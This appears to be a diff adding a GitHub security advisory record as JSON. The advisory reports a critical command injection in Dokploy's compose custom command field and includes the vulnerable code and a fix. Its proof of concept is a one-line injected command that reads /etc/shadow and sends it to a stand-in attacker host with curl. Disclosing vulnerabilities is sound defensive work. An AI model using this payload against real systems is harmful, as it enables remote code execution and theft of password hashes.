@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-qh6h-669j-77rw",
+  "repo": {
+    "cve_id": "CVE-2026-72884",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Command Injection via Compose Custom Command\n\n**Target:** Dokploy/dokploy\n**Severity:** Critical\n\n### Summary\nThe `compose.command` field passes through a cosmetic-only `sanitizeCommand()` function that only trims whitespace and strips surrounding quotes. Shell metacharacters pass through unfiltered, reaching shell execution.\n\n### Affected Code\n**File:** `packages/server/src/utils/builders/compose.ts:70-84`\n\n```typescript\nconst sanitizeCommand = (command: string) => {\n    const sanitizedCommand = command.trim();\n    const parts = sanitizedCommand.split(/\\s+/);\n    const restCommand = parts.map((arg) => arg.replace(/^\"(.*)\"$/, \"$1\"));\n    return restCommand.join(\" \");\n};\n\nexport const createCommand = (compose: ComposeNested) => {\n    if (compose.command) {\n        return `${sanitizeCommand(compose.command)}`;\n    }\n    // ...\n};\n```\n\nThe returned command is interpolated into: `env -i PATH=\"$PATH\" ${exportEnvCommand} docker ${command}`\n\n### PoC\nSet compose command to:\n```\ncompose up; curl attacker.com/$(cat /etc/shadow) #\n```\n\n### Impact\n- Full RCE on the Dokploy host\n- Any authenticated user who can update a compose service can exploit\n- `sanitizeCommand` name gives false sense of security\n\n### Remediation\nImplement a strict allowlist for compose commands, or use argument arrays with `spawnSync` instead of shell interpolation.\n\n---\n*Reported by tikket (hacktool.io) | GM-1100*\n*All testing conducted in isolated Docker environments.*",
+    "ghsa_id": "GHSA-qh6h-669j-77rw",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-qh6h-669j-77rw",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-qh6h-669j-77rw"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72884"
+      }
+    ],
+    "published_at": "2026-07-21T23:23:22Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Command Injection via Compose Custom Command",
+    "updated_at": "2026-08-10T19:29:17Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": "<= 99.99.99"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
